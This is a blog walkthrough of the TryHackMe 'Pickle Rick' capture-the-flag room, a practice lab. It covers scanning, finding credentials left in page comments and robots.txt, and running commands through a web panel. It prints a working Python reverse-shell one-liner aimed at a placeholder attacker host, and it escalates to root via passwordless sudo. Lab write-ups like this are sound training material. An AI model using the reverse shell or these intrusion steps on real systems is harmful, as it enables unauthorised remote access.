---
title: "Try Hack Me - Pickle Rick Walkthrough"
date: 2022-07-24 12:00:00
catagories: [article,walkthrough]
tags: [THM, ctf, beginner]
---
![Rick being cool.](https://imgur.com/BkKtAkO.png)

[Link to Pickle Rick Try Hack Me Room](https://tryhackme.com/room/picklerick)

Click on the image below to go to Part 1 of my video walkthough of the box:
[![Youtube Walkthrough Part 1](http://img.youtube.com/vi/vHnFwsF0gu4/0.jpg)](https://youtu.be/vHnFwsF0gu4)


## Oldie but a a Goodie! 
This is an old room on Try Hack Me. At the time I am writing this walkthrough it has been released for almost 4 years!
This room is also a CTF (Capture the Flag) room which means that it is not a "Real World" experience. Instead it is meant to help us practice our skills.

# Scanning the Host
First we will scan the host. I like to use [autorecon](https://github.com/Tib3rius/AutoRecon) by [Tib3rius](https://twitter.com/0xTib3rius) to get things started.

I create a new folder for the room and then a command that looks like:
```bash
sudo python3 /tool_repos/AutoRecon/autorecon.py <xx.xx.xx.xx> --dirbuster.threads=100 -o /path/to/box_folder && sudo chown -R <user>:<user> /path/to/box_folder
```
Ok let me explain that command:
- `sudo python3` - I use `sudo` because some of the tools autorecon uses need to be run as `root`. The problem with this is any files created are owned by `root`. (We will fix this in a second.)
- `/tool_repos/AutoRecon/autorecon.py` - I always create a directory on my kali boxes to store all the tools I `git clone` from github. (Even better if you have NFS storage your home lab, use that to mount the folder with all the tools you like. Then whenever you need to rebuild your kali box you mount the folder and all your tools are ready to go.)
- `<xx.xx.xx.xx>` - This is just a placeholder for the IP of the box you are scanning.
- `--dirbuster.threads=100` - How many dirbuster threads you want to allocate. This is an important setting. A higher number of threads helps the scan get done faster.
- `-o /path/to/box_folder` - This is the output path for the results of the scans.
- `&& sudo chown -R <user>:<user> /path/to/box_folder` - This is some magic I add to the end of the scan.
    - The `&&` just means run the next command if the previous command was successful
    - Because we used `sudo` all the files created are owned by root. So we use `sudo` here to change ownership back to us.
    - We use a recursive `chown` to set the owenership of the files back to our 'regular' user.
    - Just replace both `<user>` spots with the name of your user.

# Scan Results
After running `autorecon` we see that there are only 2 ports open:
- tcp 22 (SSH)
- tcp 80 (HTTP)

Lets's take a look at port 80.
It's important to remember that autorecon with run a ton of `NMAP` scripts against the ports it finds before we jump into a web browser and look at the page let's examine what it found.

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-chrono: Request times for /; avg: 578.44ms; min: 566.60ms; max: 605.38ms
| http-enum:
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
```
First we see that there is a `robots.txt` file these can contain some good information. Let's check it out.
- You can learn more about `robots.txt` files [HERE](https://moz.com/learn/seo/robotstxt)
- The only thing we find is: `Wubbalubbadubdub`
- `NMAP` is also telling us it found `login.php`, we will have to remember to come back to that.

NOTE: I have learned with CTFs to always note strange discoveries like this, they are usually not there by accident.

Here is the next interesting finding in from the `NMAP` scan:
```
| http-comments-displayer:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.210.147
|
|     Path: http://10.10.210.147:80/
|     Line number: 28
|     Comment:
|         <!--
|
|             Note to self, remember username!
|
|             Username: R1ckRul3s
|
|           -->
```
We should always check to HTML comments in the page source, but `NMAP` will do it for us! (To my shame, it took me a while to realize that `autorecon` was running this `NMAP` script against HTTP ports.)

So now we have a username too: `R1ckRul3s`

# Login Page
Time to check out the discovered login page.
![](/assets/images/pr_login.jpg?raw=true)

We have a username and what could be a password, let's try it!

![](/assets/images/command_panel.jpg?raw=true)

It worked! Now I really want to play with that `Command Panel`, but let's take some time to look at the tabs on the page.

All the tabs say that only the "REAL" Rick can view the pages. This may mean that are only logged in as a low level user and need a different login to view the other pages.

Ok time to play with `Command Panel`, and it looks like we have direct code execution on the box.

![](/assets/images/rce.jpg?raw=true)

But not for everything, when we try: `cat /etc/passwd` we get:

![](/assets/images/no_rce.jpg?raw=true)

If we run `pwd` we see that we are in `/var/www/html` and if we run `ls -lah` we see some files we did know about, `index.html` and `login.php` and some we didn't. Let see if we can navigate directly to these new files.

![](/assets/images/file_list.jpg?raw=true)

And we find the answer for "the first ingredient" in the file: `Sup3rS3cretPickl3Ingred.txt`

![](/assets/images/flag1.jpg?raw=true)

`clue.txt` tells us that we need to look around the filesystem some more.

We always want to know what users are on a system so let's `ls -lah /home`

![](/assets/images/pr_home.jpg?raw=true)

We see 2 users, `ubuntu` and `rick` and rick's permissions are wide open so let's explore his home directory.
But after I looked around for a while longer I didn't find much. I think it's time to pop a shell on this box.
First let's see if we can use python3:

![](/assets/images/python_v.jpg?raw=true)

Now that we know that python3 executes we can try to pop a shell!
Let's try this one. DON'T FORGET TO CHAGNE YOUR HOST IP AND PORT in the command! :)  

By the way, I tried few different reverse shells. The one below may not always work, but it did here. Many times you will have to experiment to discover with will work on a given box.  

```bash
export RHOST="xx.xx.xx.xx";export RPORT=xxxx;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
And once we get our shell, let's 'upgrade' it:

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```
Now we can go get the answer to the 2nd question! 

![](/assets/images/flag2.jpg?raw=true)

So now we have a "foothold" on the box, it's time to do some privesc (priviledge escalation)

I like to use [LSE](https://github.com/diego-treitos/linux-smart-enumeration) (Linux Smart Enumeration) tool when enumerating a system for possible privesc points.

BUT, before we do all that we should just check to see if our user has `sudo` privleges. Which in the real world the `www-data` user should never have! 
So we try `sudo -l` which should tell us what privleges the user has. 

![](/assets/images/pr_root.jpg)

Wow, we can run ALL commands as `root` with no password!! 

Looks like Rick likes to live dangerously!

You can either use `sudo` in front of all your commands or just switch to  `root` with `sudo su`

Now you can get the answer to the third question in the `/root` directory! 




